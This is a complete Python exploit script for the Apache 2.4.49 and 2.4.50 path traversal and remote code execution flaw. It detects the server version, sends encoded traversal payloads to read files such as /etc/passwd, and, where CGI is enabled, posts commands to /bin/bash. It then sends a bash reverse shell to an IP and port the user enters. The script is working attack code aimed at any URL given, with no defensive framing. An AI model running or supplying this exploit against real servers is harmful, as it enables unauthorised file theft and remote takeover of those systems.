# Apache 2.4.49 & 2.4.50 Path Traversal and RCE

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

urllib3.util.url._QUERY_CHARS.add('%')
urllib3.util.url._QUERY_CHARS.add(':')

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def find_version(r):
	print('[+] Trying to find Apache Version in the response headers...\n')
	h = r.headers
	version = ''
	for i in h:
		print(f'{i}\t{h[i]}')
		if i == "Server":
			if '2.4.49' in h[i]:
				print(' ' * 8 + '-' * len(h[i]))
				version = "2.4.49"
			if '2.4.50' in h[i]:
				print(' ' * 8 + '-' * len(h[i]))
				version = "2.4.50"
	return version

def readfile(s, url, file, vers):
	print(f"[+] Trying to read the file {file} on the target's file system...\n")
	time.sleep(1)
	path = url + '/cgi-bin'
	proxy_support = urllib.request.ProxyHandler(proxies)
	opener = urllib.request.build_opener(proxy_support)
	urllib.request.install_opener(opener)
	print('[+] Trying without cgi enabled...')
	time.sleep(1)
	if vers == "2.4.49":
		payload = '/.%2e' * 9 + file
		req = requests.Request('GET', path)
		p = req.prepare()
		p.url += payload
		resp = s.send(p)
		print(resp.request.url)
		time.sleep(1)
		try:
			r = urllib.request.urlopen(resp.request.url)
			if r.status == 200:
				print('-' * 36)
				print(r.read().decode())
				print('-' * 36)
				return True
		except urllib.error.HTTPError as e:
			print('[-] Failed to exploit <!>')
			time.sleep(1)
			print('\n[+] Trying with cgi enabled...')
			time.sleep(1)
			data = "echo Content-Type: text/plain; echo; cat " + file
			req = requests.Request('POST', path, headers={"Content-Type": "text/plain"}, data=data)
			p = req.prepare()
			payload = payload.replace(file, '/bin/bash')
			p.url += payload
			resp = s.send(p)
			print(resp.request.url)
			print(data)
			time.sleep(1)
			try:
				r = urllib.request.urlopen(resp.request.url, data=data.encode())
				if r.status == 200:
					print('-' * 36)
					print(r.read().decode())
					print('-' * 36)
					time.sleep(1)
					print('[+] CGI Enabled ! Do you want to try to spawn a reverse shell ?')
					print('[+] Please set up your listener...')
					host = input('Your IP ? ')
					port = input('Your PORT ? ')
					rev_sh = f'bash -c "bash -i >& /dev/tcp/{host}/{port} 0>&1"'
					data = data.replace('cat ' + file, rev_sh)
					r = urllib.request.urlopen(resp.request.url, data=data.encode())
					return True
			except urllib.error.HTTPError as e:
				print('[-] Failed to exploit <!>')
	elif vers == "2.4.50":
		payload = '/.%%32%65' * 9 + file
		req = requests.Request('GET', path)
		p = req.prepare()
		p.url += payload
		resp = s.send(p)
		print(resp.request.url)
		try:
			r = urllib.request.urlopen(resp.request.url)
			if r.status == 200:
				print('-' * 36)
				print(r.read().decode())
				print('-' * 36)
				return True
		except urllib.error.HTTPError as e:
			print('[-] Failed to exploit <!>')
			time.sleep(1)
			print('\n[+] Trying with cgi enabled...')
			time.sleep(1)
			data = "echo Content-Type: text/plain; echo; cat " + file
			req = requests.Request('POST', path, headers={"Content-Type": "text/plain"}, data=data)
			p = req.prepare()
			payload = payload.replace(file, '/bin/bash')
			p.url += payload
			resp = s.send(p)
			print(resp.request.url)
			print(data)
			time.sleep(1)
			try:
				r = urllib.request.urlopen(resp.request.url, data=data.encode())
				if r.status == 200:
					print('-' * 36)
					print(r.read().decode())
					print('-' * 36)
					time.sleep(1)
					print('[+] CGI Enabled ! Do you want to try to spawn a reverse shell ?')
					print('[+] Please set up your listener...')
					host = input('Your IP ? ')
					port = input('Your PORT ? ')
					rev_sh = f'bash -c "bash -i >& /dev/tcp/{host}/{port} 0>&1"'
					data = data.replace('cat ' + file, rev_sh)
					r = urllib.request.urlopen(resp.request.url, data=data.encode())
					return True
			except urllib.error.HTTPError as e:
				print('[-] Failed to exploit <!>')


def show_usage():
	print('[+] Usage: %s <URL> <FILE>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com /etc/passwd' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Apache 2.4.49 & 2.4.50 Path Traversal')
	try:
		url = sys.argv[1].strip()
		if len(sys.argv) > 2:
			file = sys.argv[2].strip()
		else:
			file = "/etc/passwd"
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			vers = find_version(r)
			print(f'\n[+] Found Server Version:\t{vers}\n')
			readfile(s, url, file, vers)
			
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
		print('[-] Set up proxy on localhost:8080 <!>')
		print('[-] Or comment line 160 "s.proxies = proxies" <!>')
	except KeyboardInterrupt:
		sys.exit(1)
	except Exception:
		sys.exit(1)

if __name__ == "__main__":
	main()

